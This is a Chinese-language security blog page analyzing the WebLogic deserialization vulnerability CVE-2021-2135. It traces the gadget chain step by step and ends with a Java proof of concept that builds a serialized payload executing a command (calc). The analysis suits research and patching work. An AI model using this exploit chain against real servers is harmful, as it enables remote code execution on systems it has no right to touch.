@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.8.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"x-f1v3.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"hide","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"flat"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Weblogic反序列化漏洞分析（CVE-2021-2135）">
+<meta name="keywords" content="Weblogic,Java,反序列化">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Weblogic反序列化漏洞分析（CVE-2021-2135）">
+<meta property="og:url" content="http://x-f1v3.github.io/blog/1626153074926.html">
+<meta property="og:site_name" content="F1v3&#39;s Notes">
+<meta property="og:description" content="Weblogic反序列化漏洞分析（CVE-2021-2135）">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://x-f1v3.github.io/images/1626153595927.png">
+<meta property="og:image" content="http://x-f1v3.github.io/images/1626153605553.png">
+<meta property="og:image" content="http://x-f1v3.github.io/images/1626153613625.png">
+<meta property="og:image" content="http://x-f1v3.github.io/images/1626153622823.png">
+<meta property="og:image" content="http://x-f1v3.github.io/images/1626153631138.png">
+<meta property="og:image" content="http://x-f1v3.github.io/images/1626153640707.png">
+<meta property="og:image" content="http://x-f1v3.github.io/images/1626153648429.png">
+<meta property="og:image" content="http://x-f1v3.github.io/images/1626153655895.png">
+<meta property="og:image" content="http://x-f1v3.github.io/images/1626153664088.png">
+<meta property="og:image" content="http://x-f1v3.github.io/images/1626153675838.png">
+<meta property="og:updated_time" content="2021-07-13T05:22:10.719Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Weblogic反序列化漏洞分析（CVE-2021-2135）">
+<meta name="twitter:description" content="Weblogic反序列化漏洞分析（CVE-2021-2135）">
+<meta name="twitter:image" content="http://x-f1v3.github.io/images/1626153595927.png">
+
+<link rel="canonical" href="http://x-f1v3.github.io/blog/1626153074926.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>Weblogic反序列化漏洞分析（CVE-2021-2135） | F1v3's Notes</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">F1v3's Notes</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="Searching..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://x-f1v3.github.io/blog/1626153074926.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="F1v3">
+      <meta itemprop="description" content="F1v3's Notes">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="F1v3's Notes">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Weblogic反序列化漏洞分析（CVE-2021-2135）
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-07-13 13:11:14 / Modified: 13:22:10" itemprop="dateCreated datePublished" datetime="2021-07-13T13:11:14+08:00">2021-07-13</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/漏洞分析/" itemprop="url" rel="index"><span itemprop="name">漏洞分析</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>3.2k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>3 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>Weblogic反序列化漏洞分析（CVE-2021-2135）</p>
+<a id="more"></a>
+<p>先看 <code>com.tangosol.util.ExternalizableHelper</code> 方法，其中有 <code>toBinary</code> 和 <code>fromBinary</code> 可以把任意类转化和重建，这里可以作为 <code>sink</code>:<br><img src="http://x-f1v3.github.io/images/1626153595927.png" alt="image"></p>
+<p>接下来就就是寻找利用链，寻找使用了这个 <code>fromBinary</code> 方法的地方，这里找到了 <code>com.tangosol.internal.util.SimpleBinaryEntry</code>:<br><img src="http://x-f1v3.github.io/images/1626153605553.png" alt="image"></p>
+<p>这里的 <code>getKey</code> 和 <code>getValue</code> 方法都用到了 <code>fromBinary</code>，此外，还有个 <code>toString</code> 方法也调用了 <code>getKey</code> 和 <code>getValue</code>，间接的使用了 <code>fromBinary</code>：<br><img src="http://x-f1v3.github.io/images/1626153613625.png" alt="image"></p>
+<p>这里的 <code>toString</code> 方法非常熟悉了，本来可以直接使用 <code>BadAttributeValueExpException.readObject()</code> 利用链，但是观察到 <code>m_key</code> 和 <code>m_value</code> 变量是用 <code>transient</code> 修饰的，所以无法通过 <code>readObject</code> 的方式来赋值。</p>
+<p>所以需要半自动化的寻找，最后作者找到了 <code>ConditionalPutAll</code> 的利用链，<br><img src="http://x-f1v3.github.io/images/1626153622823.png" alt="image"></p>
+<p>接着看 <code>ConditionalPutAll</code> 有 <code>readExternal</code> 方法调用了 <code>ExternalizableHelper.readMap</code>：<br><img src="http://x-f1v3.github.io/images/1626153631138.png" alt="image"></p>
+<p>跟进发现调用了 <code>map.put</code>:<br><img src="http://x-f1v3.github.io/images/1626153640707.png" alt="image"></p>
+<p>这里的 <code>map</code> 可以是上面的 <code>LiteMap</code>，在 <code>this.m_nImpl</code> 是 2 时，会调用 <code>Base.equals</code>:<br><img src="http://x-f1v3.github.io/images/1626153648429.png" alt="image"></p>
+<p>继续跟进 <code>Base.equals</code>:<br><img src="http://x-f1v3.github.io/images/1626153655895.png" alt="image"></p>
+<p>由于这里的传入参数都是可控的，所以这里可以控制到 <code>XString.equals</code>：<br><img src="http://x-f1v3.github.io/images/1626153664088.png" alt="image"></p>
+<p>最终执行到 <code>toString</code> 方法，整个链就走通了。</p>
+<p>POC<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception&#123;</span><br><span class="line"></span><br><span class="line">    MvelExtractor extractor = new MvelExtractor(&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);</span><br><span class="line"></span><br><span class="line">    TopNAggregator.PartialResult partialResult = new TopNAggregator.PartialResult((Comparator)extractor, 1);</span><br><span class="line">    NavigableMap&lt;Object, Object&gt; map = new TreeMap&lt;&gt;();</span><br><span class="line">    Field field = SortedBag.class.getDeclaredField(&quot;m_map&quot;);</span><br><span class="line">    field.setAccessible(true);</span><br><span class="line">    map.put(&quot;1&quot;, &quot;1&quot;);</span><br><span class="line">    field.set(partialResult, map);</span><br><span class="line"></span><br><span class="line">    Binary binarykey = ExternalizableHelper.toBinary(partialResult);</span><br><span class="line">    Binary binaryvalue = new Binary();</span><br><span class="line">    SimpleBinaryEntry simpleBinaryEntry = new SimpleBinaryEntry(binarykey, binaryvalue);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    XString xString = new XString(&quot;1&quot;);</span><br><span class="line">    LiteMap liteMap = new LiteMap();</span><br><span class="line"></span><br><span class="line">    setFieldValue(liteMap,&quot;m_nImpl&quot;,intToByteArray(3)[3]);</span><br><span class="line"></span><br><span class="line">    Field m_oContents = LiteMap.class.getDeclaredField(&quot;m_oContents&quot;);</span><br><span class="line">    m_oContents.setAccessible(true);</span><br><span class="line"></span><br><span class="line">    Map.Entry[] aEntry = new Map.Entry[8];</span><br><span class="line"></span><br><span class="line">    Map.Entry&lt;SimpleBinaryEntry, String&gt; x1 = new AbstractMap.SimpleEntry&lt;&gt;(simpleBinaryEntry, &quot;aaa&quot;);</span><br><span class="line">    Map.Entry&lt;XString, String&gt; x2 = new AbstractMap.SimpleEntry&lt;&gt;(xString, &quot;bbb&quot;);</span><br><span class="line">    aEntry[0] = x1;</span><br><span class="line">    aEntry[1] = x2;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    m_oContents.set(liteMap, aEntry);</span><br><span class="line">    ConditionalPutAll conditionalPutAll = new ConditionalPutAll();</span><br><span class="line">    setFieldValue(conditionalPutAll, &quot;m_map&quot;, liteMap);</span><br><span class="line">    AttributeHolder attributeHolder2 = new AttributeHolder();</span><br><span class="line">    field = attributeHolder2.getClass().getDeclaredField(&quot;m_oValue&quot;);</span><br><span class="line">    field.setAccessible(true);</span><br><span class="line">    field.set(attributeHolder2, conditionalPutAll);</span><br><span class="line">    File f = new File(&quot;tmp1.ser&quot;);</span><br><span class="line">    ObjectOutputStream obj = new ObjectOutputStream(new FileOutputStream(f));</span><br><span class="line">    obj.writeObject(attributeHolder2);</span><br><span class="line">    obj.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;</span><br><span class="line">    Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">    field.set(obj, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static Field getField(Class&lt;?&gt; clazz, String fieldName) &#123;</span><br><span class="line">    Field field = null;</span><br><span class="line">    try &#123;</span><br><span class="line">        field = clazz.getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">    &#125; catch (NoSuchFieldException var4) &#123;</span><br><span class="line">        if (clazz.getSuperclass() != null)</span><br><span class="line">            field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">    &#125;</span><br><span class="line">    return field;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static byte[] intToByteArray(int i) &#123;</span><br><span class="line">    byte[] result = new byte[4];</span><br><span class="line">    result[0] = (byte)((i &gt;&gt; 24) &amp; 0xFF);</span><br><span class="line">    result[1] = (byte)((i &gt;&gt; 16) &amp; 0xFF);</span><br><span class="line">    result[2] = (byte)((i &gt;&gt; 8) &amp; 0xFF);</span><br><span class="line">    result[3] = (byte)(i &amp; 0xFF);</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://x-f1v3.github.io/images/1626153675838.png" alt="image"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/Weblogic/" rel="tag"><i class="fa fa-tag"></i> Weblogic</a>
+              <a href="/tags/Java/" rel="tag"><i class="fa fa-tag"></i> Java</a>
+              <a href="/tags/反序列化/" rel="tag"><i class="fa fa-tag"></i> 反序列化</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/blog/1625734346327.html" rel="prev" title="Weblogic反序列化漏洞分析（CVE-2020-14756）">
+      <i class="fa fa-chevron-left"></i> Weblogic反序列化漏洞分析（CVE-2020-14756）
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">F1v3</p>
+  <div class="site-description" itemprop="description">F1v3's Notes</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">27</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">F1v3</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="Symbols count total">80k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">1:13</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/muse.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
